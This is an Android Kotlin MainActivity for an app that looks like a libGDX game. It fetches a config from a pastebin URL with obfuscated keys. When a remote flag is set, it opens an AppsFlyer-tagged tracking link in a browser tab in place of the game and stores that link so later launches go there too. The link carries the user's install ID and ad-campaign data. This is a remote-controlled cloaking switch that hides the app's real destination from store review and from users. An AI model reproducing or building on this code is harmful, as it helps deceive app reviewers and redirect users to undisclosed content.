package aiebu.kakono.tutokazalos

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import aiebu.kakono.tutokazalos.databinding.ActivityMainBinding
import aiebu.kakono.tutokazalos.parmengo.AppsflyerUtil
import aiebu.kakono.tutokazalos.parmengo.DataStoreManager
import aiebu.kakono.tutokazalos.parmengo.Lottie
import aiebu.kakono.tutokazalos.parmengo.Once
import aiebu.kakono.tutokazalos.parmengo.internetConnection
import aiebu.kakono.tutokazalos.parmengo.log
import aiebu.kakono.tutokazalos.parmengo.setVisible
import android.net.Uri
import androidx.browser.customtabs.CustomTabsIntent
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.IOException
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val WEB_VIEW_ID = 1000

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webURL              = "https://www.google.com/"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val okHttpClient    = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        asyncCheckInternetConnection()
        lottie.showLoader()

        coroutine.launch(Dispatchers.IO) {

//            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
            checkDataStore()

            launch(Dispatchers.Main) {
                startFragmentIdFlow.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {

                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }

                        WEB_VIEW_ID         -> {
                            val intent = CustomTabsIntent.Builder().build()

                            intent.launchUrl(this@MainActivity, Uri.parse(webURL))

                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER

                        }

                        else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)

    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "SUCCESS" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        webURL = it
                        startFragmentIdFlow.emit(WEB_VIEW_ID)
                    }
                }
                "GAME" -> {
                    log("DataStoreManager Key = GAME")
                    DataStoreManager.PariVacy.get()?.let {
                        webURL = it
                        startFragmentIdFlow.emit(R.id.libGDXFragment)

                    }

                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getFlag()
                }
            }
        }
    }

    private suspend fun getFlag() {
        val request: Request = Request.Builder().url("https://pastebin.com/raw/mKPTv1J1").build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "")
                    log("getFlag SUCCESS: $json")

                    val flag      = json.getBoolean("osMile")
                    val key       = json.getString("flatter")
                    val privacy   = json.getString("rogota")
                    val linkCheck = json.getString("bronika")
                    val link      = json.getString("sambook")

                    if (flag) getResponseFromServer(linkCheck, key, link)
                    else {
                        webURL = privacy
                        CoroutineScope(Dispatchers.IO).launch {
                            DataStoreManager.Key.update { "GAME" }
                            DataStoreManager.PariVacy.update { privacy }
                        }
                        startFragmentIdFlow.tryEmit(R.id.libGDXFragment)


                        coroutine.launch(Dispatchers.IO) {
                            DataStoreManager.Key.update { "GAME" }
                        }
                    }
                } else {
                    log("getFlag newCall FAIL: ${response.code} ${response.message}")
                    startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getFlag FAIL: $e")
            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun getResponseFromServer(linkCheck: String, key: String, link: String) {
        val request: Request = Request.Builder().url(linkCheck).build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    log("getResponseFromServer SUCCESS code = ${response.code}")
                    generateAndOpenLink(key, link)
                } else {
                    log("getResponseFromServer newCall FAIL: ${response.code} ${response.message}")
                    startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getResponseFromServer FAIL: $e")
            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun generateAndOpenLink(key: String, target: String) {
        coroutine.launch(Dispatchers.IO) {
            val completerFlow = MutableSharedFlow<Unit>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

            launch {
                AppsflyerUtil.initialize(this@MainActivity, key)
                AppsflyerUtil.checkFlow.collect { completerFlow.tryEmit(Unit) }
            }

            var counter = 0
            completerFlow.collect { if (++counter == 1) {
                val fullLink = target.plus("?") +
                        "sub1=".plus(AppsflyerUtil.campaignSubMap["sub1"].toString()).plus("&") +
                        "sub2=".plus(AppsflyerUtil.campaignSubMap["sub2"].toString()).plus("&") +
                        "sub3=".plus(AppsflyerUtil.campaignSubMap["sub3"].toString()).plus("&") +
                        "sub4=".plus(AppsflyerUtil.campaignSubMap["sub4"].toString()).plus("&") +
                        "sub5=".plus(AppsflyerUtil.campaignSubMap["sub5"].toString()).plus("&") +
                        "sub6=".plus(AppsflyerUtil.campaignSubMap["sub6"].toString()).plus("&") +
                        "sub_id_8=" .plus(AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)).plus("&") +
                        "sub_id_9=" .plus(AppsflyerUtil.dataMap["orig_cost"]     .toString()).plus("&") +
                        "sub_id_10=".plus(AppsflyerUtil.dataMap["cost_cents_USD"].toString()).plus("&") +
                        "sub_id_11=".plus(AppsflyerUtil.dataMap["media_source"]  .toString()).plus("&") +
                        "sub_id_12=".plus(appContext.packageName)

                log("full: $fullLink")

                webURL = fullLink
                startFragmentIdFlow.tryEmit(WEB_VIEW_ID)

                withContext(Dispatchers.IO) {
                    DataStoreManager.Key.update { "SUCCESS" }
                    DataStoreManager.Link.update { fullLink }
                }
            } }
        }
    }

}